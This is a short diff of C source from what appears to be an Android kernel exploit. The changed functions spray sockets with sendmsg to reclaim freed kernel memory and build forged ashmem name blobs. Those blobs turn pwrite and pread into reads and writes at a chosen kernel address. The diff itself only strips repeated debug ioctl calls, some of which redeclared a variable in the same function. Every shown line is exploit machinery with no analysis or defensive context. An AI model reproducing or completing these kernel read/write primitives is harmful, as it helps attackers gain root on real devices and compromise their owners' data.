@@ -929,8 +929,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int reclaim_sent = 0;
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
-  ioctl(fd, ASHMEM_SET_SIZE, len);
-  int set_size_ret = ioctl(fd, ASHMEM_SET_SIZE, len); pr_info("ASHMEM_SET_SIZE ret=%d errno=%d\n", set_size_ret, errno);
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
@@ -987,8 +985,6 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
   put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
-  ioctl(fd, ASHMEM_SET_SIZE, len);
-  int set_size_ret = ioctl(fd, ASHMEM_SET_SIZE, len); pr_info("ASHMEM_SET_SIZE ret=%d errno=%d\n", set_size_ret, errno);
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
   if (set_ret != 0) {
@@ -997,8 +993,6 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   }
 
   errno = 0;
-  ioctl(fd, ASHMEM_SET_SIZE, len);
-  int set_size_ret = ioctl(fd, ASHMEM_SET_SIZE, len); pr_info("ASHMEM_SET_SIZE ret=%d errno=%d\n", set_size_ret, errno);
   ssize_t wr = pwrite(fd, data, len, 0); pr_info("pwrite ret=%zd errno=%d len=%zu\n", wr, errno, len);
   return wr;
 }
@@ -1011,8 +1005,6 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
-  ioctl(fd, ASHMEM_SET_SIZE, len);
-  int set_size_ret = ioctl(fd, ASHMEM_SET_SIZE, len); pr_info("ASHMEM_SET_SIZE ret=%d errno=%d\n", set_size_ret, errno);
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
   int set_errno = errno;
   if (set_ret != 0) {
@@ -1021,8 +1013,6 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   }
 
   errno = 0;
-  ioctl(fd, ASHMEM_SET_SIZE, len);
-  int set_size_ret = ioctl(fd, ASHMEM_SET_SIZE, len); pr_info("ASHMEM_SET_SIZE ret=%d errno=%d\n", set_size_ret, errno);
   ssize_t rd = pread(fd, data, len, pos);
   return rd;
 }
